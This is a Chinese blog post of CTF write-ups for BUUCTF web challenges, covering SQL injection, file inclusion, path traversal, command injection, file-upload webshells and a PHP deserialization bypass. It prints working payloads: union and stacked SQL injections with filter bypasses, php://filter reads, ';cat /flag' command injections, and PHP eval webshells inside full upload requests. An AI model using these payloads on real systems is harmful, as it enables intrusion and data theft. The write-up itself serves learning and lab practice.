@@ -1,0 +1,1092 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>buu第一页 | jujub3</title>
+    <meta name="author" content="jujub3" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/head.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>JUJUB3</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags/THM">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;JUJUB3</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags/THM">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>buu第一页</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/4/4
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/buu/" style="color: #00bcd4">
+                    buu
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>z之前写的，把它放在博客上吧</p>
+<span id="more"></span>
+
+<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>测试密码单引号出现</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1729570752160-3c1b8358-683b-45ca-9d40-d57c020be211.png" alt="img"></p>
+<p>断定存在sql注入，试了一下万能密码，flag直接就出来了</p>
+<p>最后的答案：1’ or 1&#x3D;1#<img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1729570795869-ea89c416-cdf5-4dd9-bb20-ad9d8941c442.png" alt="img"></p>
+<p>拿到flag	</p>
+<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1729570898971-7af6eebe-7562-4132-bc89-0e92d378dfce.png" alt="img">查看源码，发现，在源码里插入了一段php代码，如果cat&#x3D;dog，就会输出一个东西，所以就试一试，最后flag直接就出来了</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1729571004490-273cf837-0ea7-4697-b01c-0a6e9125ca35.png" alt="img"></p>
+<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>这题查看源码得到一个文件source.php，是一段代码</p>
+<pre><code class="language-plain"> &lt;?php
+    highlight_file(__FILE__);
+    class emmm
+    &#123;
+        public static function checkFile(&amp;$page)
+        &#123;
+            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
+            if (! isset($page) || !is_string($page)) &#123;
+                echo &quot;you can&#39;t see it&quot;;
+                return false;
+            &#125;
+            //如果要返回true，$page需要有值，并且是字符串
+
+            if (in_array($page, $whitelist)) &#123;
+                return true;
+            &#125;
+            //如果要返回true，$page的值需要包含白名单hint.php或者source.php
+
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
+            );
+            //mb_strpos($page . &#39;?&#39;, &#39;?&#39;)表示在$page的最后添加一个？，mb_strpos也就是返回第一个问号出现的位置
+            //这段代码表示：返回$page问号之前的部分的值给$_page
+            if (in_array($_page, $whitelist)) &#123;
+                return true;
+            &#125;
+            //检查$_page中是否含有白名单，如果有返回true
+
+          
+            $_page = urldecode($page);
+            $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
+            );
+            if (in_array($_page, $whitelist)) &#123;
+                return true;
+            &#125;
+            //这段代码就是进行解码，然后进行上一步操作
+            echo &quot;you can&#39;t see it&quot;;
+            return false;
+        &#125;
+    &#125;
+
+    if (! empty($_REQUEST[&#39;file&#39;])
+        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
+        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
+    ) &#123;
+        include $_REQUEST[&#39;file&#39;];
+        exit;
+    &#125; else &#123;
+        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
+    &#125;  
+?&gt; 
+</code></pre>
+<p>首先是一个类，类中有个函数checkFile，总体来看，要想拿到flag，传入的file就要在?之前的内容包含白名单，</p>
+<p>最后的payload：<br><a target="_blank" rel="noopener" href="http://a60c7759-77a0-4d5b-9f92-9cabe917d48b.node5.buuoj.cn:81/source.php?file=hint.php?../../../../../ffffllllaaaagggg">http://a60c7759-77a0-4d5b-9f92-9cabe917d48b.node5.buuoj.cn:81/source.php?file=hint.php?../../../../../ffffllllaaaagggg</a></p>
+<p>这里有个注意就是：在include文件包含的时候，会把hint.php?当成一个不存在的目录（如果一个目录不存在就会自动生成，与前面的source.php在同一级目录），最后再利用目录穿越，包含文件ffffllllaaaagggg</p>
+<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>这一题打开就出现这个，查看源码也没有什么东西，但是注意到网址</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1730729416246-9211e602-d615-4fee-b9e0-7f939830ccce.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="http://ab5a96ef-ee92-4513-b177-f165752c01e4.node5.buuoj.cn:81/?file=flag.php">http://ab5a96ef-ee92-4513-b177-f165752c01e4.node5.buuoj.cn:81/?file=flag.php</a></p>
+<p>最后的?file&#x3D;flag.php，看起来像一个文件包含，可能是因为一些编码的问题，导致flag无法显示出来，</p>
+<p>于是就用base64编码，</p>
+<p>payload：</p>
+<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1730729582258-8e0efdc7-8a05-4dd7-a085-5664a366db19.png" alt="img"></p>
+<p>最后就出来了</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1730729635392-43bea9f1-0d97-4587-8bee-8ae48b8a077b.png" alt="img"></p>
+<p>最后解码是一个php代码，如果不转为base64，就会直接当成php代码执行，所以只会输出最开始那样</p>
+<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1730729794168-fabd5383-f41c-4cbf-a42e-9f36b0be6970.png" alt="img"></p>
+<p>这题就是一个ping，利用分号可以同时执行多个命令，</p>
+<p>最后的payload：localhost;cat &#x2F;flag</p>
+<p>也就是现会ping本地，然后再执行cat &#x2F;flag</p>
+<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>这题相对于上一题，就是把flag和空格ban了，</p>
+<p>但是还可以用变量替换：</p>
+<p><a target="_blank" rel="noopener" href="http://413d2715-06dd-4801-8aee-1ede20d27729.node5.buuoj.cn:81/?ip=localhost;w=ag.php;q=fl;cat$IFS$9$q$w">http://413d2715-06dd-4801-8aee-1ede20d27729.node5.buuoj.cn:81/?ip=localhost;w=ag.php;q=fl;cat$IFS$9$q$w</a></p>
+<p>还有个注意的是，贪婪匹配导致不能依次出现 f  l   a  g  这四个字母</p>
+<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>这题考察的是堆叠注入，所谓的堆叠注入就是可以执行多条sql语句</p>
+<p>这题的话，首先，输入1有结果，而0没有结果，所以猜测存在或运算 ||</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733058177785-fc33094e-21bb-4a7d-a221-7c70a917d5ce.png" alt="img"></p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733058188476-8b79df77-265d-407b-acd6-cb4bc65c37ad.png" alt="img"></p>
+<p>接着查询数据库，在后面加上一条语句，select databases；</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733058336587-75ce2d5f-58b0-4c1f-a581-b45b3620bc7a.png" alt="img"></p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733058333446-2677aea5-d032-49c4-9e95-03622382d472.png" alt="img"></p>
+<p>然后看大佬的wp说sql语句是：select $_POST[‘query’] || flag from Flag;</p>
+<p>show databases;                            显示所有数据库</p>
+<p>show tables;                                   显示所有列</p>
+<p>show columns from table;             从	table这个表里展示所有列</p>
+<h3 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h3><p>直接payload：</p>
+<p>1;select *,1<img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733058418219-3eea845e-a45f-4b36-8220-653be08acf05.png" alt="img"></p>
+<p>解释一下就是1先于flag进行或运算，得到结果1，然后执行查询语句</p>
+<p>select 1;select *,1 from Flag;</p>
+<p>最后的查询结果其实就是查出来flag了，然后在最后加上一列1</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733058568478-254b9cca-f6cd-4ac6-a390-09a38c4cde94.png" alt="img"></p>
+<h3 id="第二中解法"><a href="#第二中解法" class="headerlink" title="第二中解法:"></a>第二中解法:</h3><p>这种解法就是将   ||  运算符当作连接符号，</p>
+<p>需要配置SQL_mode&#x3D;PIPES_AS_CONCAT</p>
+<p>payload:</p>
+<p>query&#x3D;1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733059957240-6d6b9de3-a67e-4bc3-b9ad-04efd82dd04e.png" alt="img"></p>
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>sql注入首先判断sql语句的闭合形式，经过测试，这题是单引号闭合，爆数据库</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733060673924-a600daf2-90e3-423e-a896-3825c49746cb.png" alt="img"></p>
+<p>爆表；</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733060705214-3672309a-f7ac-4d47-9979-0d18301dd021.png" alt="img"></p>
+<p>知识点：</p>
+<p>当需要查询一个数字表的时候，需要将数字用反引号包裹起来</p>
+<p>?inject&#x3D;1’;show columns from <code>1919810931114514</code>;</p>
+<p>这里因为select 被过滤了，先用show来看一下有哪些列</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733060888473-026bfd20-4dd7-4db2-a4aa-989feb041f83.png" alt="img"></p>
+<p>然后看到有个flag的列。</p>
+<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>十六进制编码绕过：</p>
+<p>将select * from <code>1919810931114514</code>;进行十六进制编码</p>
+<p>得到：73656c656374202a2066726f6d20603139313938313039333131313435313460</p>
+<p>然后将他赋给一个变量：seT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460</p>
+<p>最后的payload：</p>
+<p>1’;seT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</p>
+<p>注意加上十六进制标签：0x</p>
+<p>prepare…from…   ：是预处理语句，会进行编码转换</p>
+<p>execute   ：用来执行prepare创建的sql语句。</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733061979550-23cb4c96-1fa9-4067-bc97-1901821aaf63.png" alt="img"></p>
+<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>使用handler语句：</p>
+<p>handler table_name open;			打开一个表名</p>
+<p>handler table_name read first&#x2F;next;        获取这个表的第一行&#x2F;下一行</p>
+<p>payload：</p>
+<p>1’;handler <code>1919810931114514</code> open;handler <code>1919810931114514</code> read first;</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733062937740-fe8e76c8-4fc7-4d9a-9b4c-2ab931facc01.png" alt="img"></p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>利用concat拼接select+预处理</p>
+<p>payload:</p>
+<p>1’;prepare a from concat(‘s’,’elect * from <code>1919810931114514</code>‘);execute a;#</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733063784575-a71b1392-2f17-4474-8dbc-90308330a45a.png" alt="img"></p>
+<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>这就是纯一道简单sql题目，没有什么过滤，过滤了#可以使用%23来代替</p>
+<p>首先爆表：</p>
+<p>123’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()%23</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733147279039-78c33e83-083a-46c6-8be9-19f652c29fa0.png" alt="img"></p>
+<p>然后爆列：（这里试过第一个表了，没有什么东西）</p>
+<p>123’ union select  1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’l0ve1ysq1’%23</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733147329085-1112895b-1ad8-4053-b0db-2f4593c0a3dc.png" alt="img"></p>
+<p>最后拿到flag：</p>
+<p>123’ union select 1,group_concat(username,’~’,password),3 from l0ve1ysq1%23</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733147377928-f28f09a7-6799-4276-b4d6-fb114bbec505.png" alt="img"></p>
+<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>这题打开，查看源码，发现一个php文件</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733147727553-efa7025d-b379-4f3f-9a28-d791a2f27071.png" alt="img"></p>
+<p>最后通过抓包发现一个secr3t.php</p>
+<p>最后是一个代码审计</p>
+<pre><code class="language-plain">&lt;?php
+    highlight_file(__FILE__);
+    error_reporting(0);
+    $file=$_GET[&#39;file&#39;];
+    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
+        echo &quot;Oh no!&quot;;
+        exit();
+    &#125;
+    include($file); 
+//flag放在了flag.php里
+?&gt;
+</code></pre>
+<p>strstr($file,”..&#x2F;“)：用来检查$file中是否含有..&#x2F;，如果有返回true，否则false</p>
+<p>stristr($file, “tp”)：用来检查$file中是否含有 tp（忽略大小写），函数中的i表示忽略大小写，有返回true</p>
+<p>..&#x2F; ：file协议就被限制了</p>
+<p>还可以有php为协议，首先的话是先试了一下根目录下的flag.php，没回显</p>
+<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag.php</p>
+<p>再试&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php，</p>
+<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
+<p>最后拿去解码，直接出flag</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733148573125-00a42cb7-0dae-4a83-b695-e45f6be5671f.png" alt="img"></p>
+<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>最后的数据包：</p>
+<pre><code class="language-plain">GET /Secret.php HTTP/1.1
+Host: node5.buuoj.cn:28819
+User-Agent: Syclover
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+X-Forwarded-For: localhost
+Referer: https://Sycsecret.buuoj.cn
+Priority: u=0, i
+</code></pre>
+<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>这题是一个文件上传，首先试一试php能不能上传（</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733149572070-ad6f4a2f-cc2e-4605-af0c-56d4679fa9eb.png" alt="img"></p>
+<p>改文件类型，然后加GIF89a</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733149646471-2c5c331d-6b60-4c9a-8475-2e7c897846c2.png" alt="img"></p>
+<p>这次是php，然后改后缀为phtml</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733149679799-20c857e3-5c84-497f-9af6-4c479a908cdf.png" alt="img"></p>
+<p>然后是php标识符，换一个木马：</p>
+<script language="php">@eval($_POST['cmd'])</script>
+
+<p>最后上传成功，数据包：</p>
+<pre><code class="language-plain">POST /upload_file.php HTTP/1.1
+Host: 550da846-1251-439b-9d9c-e41d3a235eba.node5.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------345885807924535443833968758605
+Content-Length: 396
+Origin: http://550da846-1251-439b-9d9c-e41d3a235eba.node5.buuoj.cn:81
+Connection: keep-alive
+Referer: http://550da846-1251-439b-9d9c-e41d3a235eba.node5.buuoj.cn:81/
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+-----------------------------345885807924535443833968758605
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.phtml&quot;
+Content-Type: image/png
+
+GIF89a
+&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;])&lt;/script&gt;
+-----------------------------345885807924535443833968758605
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+提交
+-----------------------------345885807924535443833968758605--
+</code></pre>
+<p>访问upload目录下的1.phtml（路径猜出来的）</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733149759306-9777b5c6-a95b-4ddd-99a5-42e62b11f24b.png" alt="img"></p>
+<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>题目进去直接给一句话了</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733149870776-6301f2f3-4d3a-49ad-a825-9e1d440037b8.png" alt="img"></p>
+<p>直接连上拿flag</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733149944136-b8a3830f-18a9-475c-88e5-641a457d0fb9.png" alt="img"></p>
+<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>这题还是一样传一个phtml文件就行了，这里给出数据包</p>
+<pre><code class="language-plain">POST / HTTP/1.1
+Host: e36847a0-00ae-4f5c-89cf-0880343f3e29.node5.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------342542114227482252831393085712
+Content-Length: 688
+Origin: http://e36847a0-00ae-4f5c-89cf-0880343f3e29.node5.buuoj.cn:81
+Connection: keep-alive
+Referer: http://e36847a0-00ae-4f5c-89cf-0880343f3e29.node5.buuoj.cn:81/
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+-----------------------------342542114227482252831393085712
+Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.phtml&quot;
+Content-Type: image/png
+
+GIF89a
+&lt;?= eval($_POST[1]);?&gt;
+�PNG
+
+-----------------------------342542114227482252831393085712
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+upload
+-----------------------------342542114227482252831393085712--
+</code></pre>
+<p>最后执行命令成功</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733150356314-4604a199-cbd9-4593-96e0-901235f685c3.png" alt="img"></p>
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>这题的话还是一样先判断它的闭合方式，结果为单引号闭合。</p>
+<p>过滤了空格，用%23来代替。</p>
+<p>1’ union select 1,2,3%23</p>
+<p>最后按照正常的联合注入，然后发现语法报错，发现，union select 被换成空格了，这里就用双写绕过了，</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733219097449-a1a089c0-10fb-485d-99d6-23cd16f98eeb.png" alt="img"></p>
+<p>1’ uniounionn sselectelect 1,2,3%23</p>
+<p>注入成功</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733219207773-f358a26b-a112-460a-a8a6-1e9e273c8f10.png" alt="img"></p>
+<p>接着爆表：1’ uniounionn sselectelect 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()%23</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733219345286-dc691c62-395e-4741-ad4a-7cde685f0910.png" alt="img"></p>
+<p>发现or，from 和where也被过滤了。</p>
+<p>1’ uniounionn sselectelect 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database()%23</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733219620864-daeb90d5-a05d-4078-bf4a-c9a66a9c6d29.png" alt="img"></p>
+<p>接着爆列：</p>
+<p>1’ uniounionn sselectelect 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;’geekuser’%23</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733219786783-d537bf6e-cfe1-4a36-8669-50972f9110e4.png" alt="img"></p>
+<p>最后的payload：</p>
+<p>1’ uniounionn sselectelect 1,group_concat(passwoorrd),1 frfromom b4bsql%23</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733220137421-ed4dd222-3514-4614-82cf-b151b927e8b5.png" alt="img"></p>
+<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733224740382-ca22ef21-2925-4a4c-adee-a6bf3d7b4ebd.png" alt="img"></p>
+<p>这题存在一个<a target="_blank" rel="noopener" href="http://www.zip文件,下载后是这样的/">www.zip文件，下载后是这样的</a></p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733225844772-d1d9a970-a69a-4a37-b836-ad89e436e8bf.png" alt="img"></p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733225864212-2b99930a-66cb-4fdc-8428-69aab297d772.png" alt="img"></p>
+<p>要echo flag需要将密码设置为100，然后还有一点就是绕过wakeup()魔术方法。</p>
+<p>wakeup()绕过：当序列化字符串中属性个数大于真实属性个数，就会导致反序列化异常，从而跳过__wakeup()</p>
+<p>最后的php脚本：</p>
+<pre><code class="language-plain">&lt;?php
+class Name
+&#123;
+    private $username = &#39;admin&#39;;
+    private $password = &#39;100&#39;;
+&#125;
+$a=new Name();
+echo urlencode(str_replace(&#39;2&#39;,&#39;3&#39;,serialize($a)));
+</code></pre>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733226164309-7f5a15ad-d335-4d74-be6b-52152d7509d2.png" alt="img"></p>
